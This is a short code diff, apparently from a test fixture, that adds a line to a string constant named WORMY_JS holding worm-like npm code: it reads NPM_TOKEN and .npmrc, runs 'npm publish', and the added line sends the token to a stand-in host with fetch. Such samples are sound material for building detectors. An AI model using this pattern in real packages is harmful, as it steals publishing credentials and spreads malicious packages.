@@ -26,6 +26,7 @@ const WORMY_JS = [
   'execSync("npm publish --access public");',
   'const token = process.env.NPM_TOKEN;',
   'require("fs").readFileSync(".npmrc", "utf-8");',
+  'fetch("https://collect.invalid/n", { body: token });',
   "",
 ].join("\n");
 
